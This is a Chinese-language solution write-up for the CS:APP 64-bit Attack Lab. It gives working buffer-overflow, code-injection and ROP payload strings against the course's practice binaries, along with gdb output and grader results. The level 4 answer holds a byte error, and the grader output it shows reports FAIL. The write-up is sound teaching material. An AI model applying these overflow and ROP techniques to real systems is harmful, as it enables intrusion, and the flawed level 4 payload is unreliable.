# Guide

## 知识储备

  1. lab2所拥有的C与汇编的知识
  2. 函数调用时内存上栈知识(**注意本lab是x86-64的 和32位(lab3-buffer-32-bit)有很多差别 建议先完成32位的**)
  3. gdb 动态调试
  4. 编译链接等相关知识

## 题目

[官方文档](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

任务:

1. 利用overflow 调用ctarget里的touch1,touch2,touch3
2. 利用overflow 在rtarget里同样调用touch2,touch3

`hex2raw`把16进制字符转换为对应的binary数据的工具

对于每一个得出的利用字串写在exploit.txt里,如果调用成功以下会输出正确的结果

`unix>cat exploit.txt | ./hex2raw | ./ctarget -q`

## Solution

  `git diff default:lab3-buffer-64-bit finish:lab3-buffer-64-bit`

### level 1

首先跟着官方文档看,意思是利用getbuf函数的堆栈bug可能导致的overflow 来完成lab

因为我们是离线，所以每次运行使用记得加上`-q`参数

任务是返回时调用touch1

```
(gdb) b getbuf
(gdb) r -q
(gdb) disassemble
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>: sub    $0x28,%rsp
   0x00000000004017ac <+4>: mov    %rsp,%rdi
   0x00000000004017af <+7>: callq  0x401a40 <Gets>

(gdb) disassemble touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>: sub    $0x8,%rsp
```

说明利用大于`0x28`的输入进行栈上的数据覆盖(overflow),从而覆盖返回地址到touch1的入口地址

在这个breakpoint的时候`rsp`还没减`0x28`

栈高地址

|return address high|0x32(%rsp)|
|---|---|
|return address low|0x28(%rsp) <+0>时刻rsp的位置|
|...|...|
|我们输入开始的位置|(%rsp) |

栈低地址

用`(gdb)info registers`可以看到rbp不再和32位的作用一样

`0x0-(-0x28)=40` 所以要`40`个字符以后才会覆盖`return address`也就是我们要写入的touch1的地址 `0x00 00 00 00 00 40 17 c0 `注意小端表示法

`00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00`

写入`exploit.ans1`

测试

```
cat exploit.ans1 | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
  user id bovik
  course  15213-f15
  lab attacklab
  result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

有的博文的高位没有写零,也就是最后5个`00`只有1个 虽然也能执行 因为原本存的地址 就是`0x00 00 00 00 00 40 19 76` 直接覆盖低位也是填入了“正确”的返回地址,还要感谢字符串借尾符是'\0'也就是`00`

那这样说 我只写到`c0 17 40`也是对的,一个`00`都不用加 [注意字符串输入会被Gets补结束'\0' ,如果只写到`c0 17`就结束的话`40`会被结束'\0'覆盖]

只能说“刚好”又不是“刚好”的对了,所以真正正确的应该有5个`00`

### level 2

```
(gdb) disass touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>: sub    $0x8,%rsp
   0x00000000004017f0 <+4>: mov    %edi,%edx
   0x00000000004017f2 <+6>: movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:  cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:  jne    0x401824 <touch2+56>
```

看官方文档和objdump出来的自带注释 猜都猜到了 `cmp    0x202ce2(%rip),%edi`也就是if里面的比较

注意x86-64和32位传参数的不同(32位常用栈传参), 速度:寄存器>cache>memory

通过edi传参,那我们就自己写"函数"让`edi`里存入`cookie(0x59b997fa)` 再跳到`touch2`

注意RET指令则是将栈顶的返回地址弹出到EIP，然后按照EIP此时指示的指令地址继续执行程序。LEAVE指令是将栈指针指向帧指针，然后POP备份的原帧指针到%EBP。

所以编写`ans2.s`文件

```
movl $0x59b997fa,%rdi
push $0x4017ec
ret
```

用`gcc -c ans2.s`编译为`ans2.o`

再用`objdump -d ans2.o`得到

```
   0: 48 c7 c7 fa 97 b9 59  mov    $0x59b997fa,%rdi
   7: 68 ec 17 40 00        pushq  $0x4017ec
   c: c3                    retq
```

再次注意小端

注入代码构造`前面一共40个  跳转到注入代码入口` 通过断点获得输入未知rsp的指向 也就是我们输入的起始地址`0x5561DC78`

`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00`

测试

```
cat exploit.ans2 | ./hex2raw  | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
  user id bovik
  course  15213-f15
  lab attacklab
  result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

### level 3

根据官方文档 我们要让`hexmatch`函数返回`true` (感谢官方文档 不需要我们做lab2的理解汇编翻译工作了)

```
(gdb) disas touch3
Dump of assembler code for function touch3:
   0x00000000004018fa <+0>: push   %rbx
   0x00000000004018fb <+1>: mov    %rdi,%rbx
   0x00000000004018fe <+4>: movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:  mov    %rdi,%rsi
   0x000000000040190b <+17>:  mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:  callq  0x40184c <hexmatch>
   0x0000000000401916 <+28>:  test   %eax,%eax
```

根据上一题的经验 `rdi` 也就是我们传入的地址 `rdi->touch3->rsi->hexmatch`

根据c代码 也就是传入一个指向字符串的指针,要这个被指向的字符串和`cookie(0x59b997fa)`一样

编写注入代码 把字符串地址(根据上一题`0x5561DC78`是输入起始地址 所以大概放在`0x5561DC78+0x28+0x8)`放入`rdi`,放入`touch3`的地址 返回

**注:因为这里会再调函数 也就意味着我们的overflow也会被覆盖,所以要找一个安全的地方,在random面前哪里安全?(其实没random的事 但不要有利用random不random的想法吧) ,只有test(调用getbuf的函数 或更上)的栈里**

还要 一段"59b997fa"的字符串对应的16进制 注意是字符串比较末尾添0 这里倒是 末尾可加00也可以不加00 因为本来Gets读入过程中会加'\0'

```
(gdb) p/x "59b997fa"
$3 = {0x35, 0x39, 0x62, 0x39, 0x39, 0x37, 0x66, 0x61, 0x0}
```

```
movl $0x5561dca8,%rdi
push $0x4018fa
ret
```

`gcc+objdump`得到

```
   0: 48 c7 c7 a8 dc 61 55  mov    $0x5561dca8,%rdi
   7: 68 fa 18 40 00        pushq  $0x4018fa
   c: c3                    retq
```

`48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00`

测试

```
cat exploit.ans3 | ./hex2raw  | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
  user id bovik
  course  15213-f15
  lab attacklab
  result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

### level 4

ROP 根据文档说 code-injection (也就是上面三个level我们干的事)有办法减轻/比如不定的栈位置,设置不可执行栈段

因此聪明的盆友有了一个利用既有代码的方法

文档教你如何利用看起来没用的代码`c7 07 d4 48 89 c7 c3` 如果从`48 89 c7` 这一段 就变成了完全不一样的功能的代码了

并且在下面附上了指令表

我们这两个level的事情是要 利用 这些 "隐藏的" 代码 实现第二第三关干的事情 并且只能使用 `start_farm`到 `end_farm`之间的代码

也就是先把`cookie（0x59b997fa）`放入rdi 再跳到`touch2（0x4017ec)`

看看 farm.c提供了我们什么

1. 可能隐藏的有用代码
2. 对eax的 各种写入
3. 对(rdi)的各种写入

所以 要把`rdi`写入值 我们找` 59 `都找不到 所以直接写是不行了

再看看提供的指令表

1. 寄存器到寄存器
2. 栈到寄存器
3. 与/或/cmp/test

现在能想到的办法也就是 `栈->中间寄存器->di` 或者 `栈->di`

先把farm以外的删除掉 搜索 ` 5[8-f] ` 也就是所有可能的pop指令 **[vim正则大法好]** 找到了4处

但能用的只有两处(`nop` 的指令是 `90`)

```
4019a7: 8d 87 51 73 58 90
4019ad: c3
和
4019ca: b8 29 58 90 c3
```

这两处都是`pop`到`rax` (指令`58`)

所以 我们构造栈

```
touch2地址
rax->rdi 的指令地址
cookie
popq rax的指令地址
```

其中`rax->rdi`可以用的有

```
4019a0: 8d 87 48 89 c7 c3
和
4019c3: c7 07 48 89 c7 90
4019c9: c3
```

所以有2*2=4种答案哦
选择其中一种构造

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 ba 59 00 00 00 00
a3 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

验证

```
cat exploit.ans4 | ./hex2raw | ./rtarget -q
Cookie: 0x59b997fa
Type string:Misfire: You called touch2(0x59ba97fa)
FAIL: Would have posted the following:
  user id bovik
  course  15213-f15
  lab attacklab
  result  1:FAIL:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 BA 59 00 00 00 00 A3 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

### level 5

非常不友好的 作者竟然打出了**劝退**

> Before you take on the Phase 5, pause to consider what you have accomplished so far.  In Phases 2 and 3,you caused a program to execute machine code of your own design. If CTARGET had been a network server,you could have injected your own code into a distant machine.  In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks.  Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.



如果你只利用 `加法+写入` 来完成这个level 我只能说 技不如人,甘拜下风

直接对应level3 能换的换,根据上一个lab的经验

```
mov    $0x5561dca8,%rdi
pushq  $0x4018fa
retq
```

变为

```
字串起始地址->rdi
touch3地址放入栈
```

注意到这里的起始地址是**会变**的不像level3那样是固定的 但根据马克思说的运动是绝对的(附议)静止是相对的。所以 这个地址相对于`esp`指向的地址依然静止

变为

```
esp -> 寄存器
在寄存器里运算出 字符串的地址
放入rdi
touch3地址放入栈
```

看看64位文档 `RAX、RCX、RDX、R8、R9、R10、R11` 被视为易失的，而 `RCX、RDX、R8、R9` 一般用来传参，在这个lab里的文档也没教我们怎么玩`R10,R11` (64文档说必须根据需要由调用方保留；在 `syscall/sysret` 指令中使用)

当然文档说的你也可以不听 :-) 比如下面通过**实践**发现 不用`cx`,`dx` 根本行不通

虽然也可能从汇编中看出`add`指令 或者 查到`add`指令 不过既然`farm.c`都提供了`add_xy`函数 为什么不直接用呢?也就是加法两个数一个放入rdi(我们已经可以做到)另一个放入`rsi`

```
00000000004019d6 <add_xy>:
   4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax
   4019da: c3                    retq

```

**写入`rsi`**

嗨呀好气啊 突然想起没有popq到rsi  只有先到ax再到rsi了，从`pop rsi`变成`pop rax;mov rax esi`,搜`48 89`又发现根本没有能写`rsi`的

那就之有用下面的写入`esi` 是以 `89` 开始(这里可以发现 64位的指令对应多了一个`48` ) 再次给`vim`打广告 搜索` 89 [c-f][6e] ` 找到了唯一一个可用的写入`rsi`的`89 ce 90 90 c3`

```
401a11: 8d 87 89 ce 90 90
401a17: c3
```

所以路线变成了`pop->rax->cx->si`

那下面问题来了`rax`到`cx`,看表中`cx`的列 先搜`89 [c-f][91]`

到`cx`的一个**能用**的都没有?

哎我们是不是有一个表没有用 仔细看它们不光没有被我们使用，也不会影响我们要用的寄存器，最多影响跳转，下面开始展现奇迹的时候开始了 我们要用没用的代码让它"有用"

刚刚通过` 89 [c-f][91]`搜到的 (还有一处也是`89 d1 ;cmp ;ret`可以用)

```
401a68: b8 89 d1 08 db
401a6d: c3
```

这一段从`89 d1 08 db c3`开始 也就是`edx->ecx ; orb bl,bl ; ret`

再找到`dx`的,咦!棒 `eax->edx;test;ret`

```
401a40: 8d 87 89 c2 84 c0
401a46: c3
```

完美 这样就把`pop`到`si`连起来了`pop->ax->dx>cx->si`,可以看出出题者不但言语劝退还代码劝退。

**拿`rsp`** 

然后发现搜`48 89 e` 只有 `48 89 e0`可用 所以`rsp->rax->rdi`

所以栈设计变为

栈高地址

```
字符串            35 39 62 39 39 37 66 61 00
touch3地址        fa 18 40 00 00 00 00 00
mov rax,rdi的地址 (48 89 c7 c3)
add_xy的地址      d6 19 40 00 00 00 00 00
mov ecx,esi的地址 (89 ce 90 90 c3)
mov edx,ecx的地址 (89 d1 08 db c3)
mov eax,edx的地址 (89 c2 84 c0 c3)
偏移量            $0x48(从读rsp的指令到字符串的距离)
popq rax的地址    (58 90 c3)
mov rax,rdi的地址 (48 89 c7 c3)
mov rsp,rax的地址 (48 89 e0 c3)
```

栈低地址

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
42 1a 40 00 00 00 00 00
69 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61 00
```

测试

```
cat exploit.ans5 | ./hex2raw | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
  user id bovik
  course  15213-f15
  lab attacklab
  result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 42 1A 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

这里需要注意 如果我们只把`esp`复制到`eax` 是不行的

通过设置断点可一看到rsp 的高位是非零的,所以如果`06 1a 40 00 00 00 00 00(mov rsp rax 的地址)` 改为 `07 1a 40 00 00 00 00 00(mov esp eax 的地址)`就不能成功

```
(gdb) p $rsp
$1 = (void *) 0x7ffffffab6a8
```

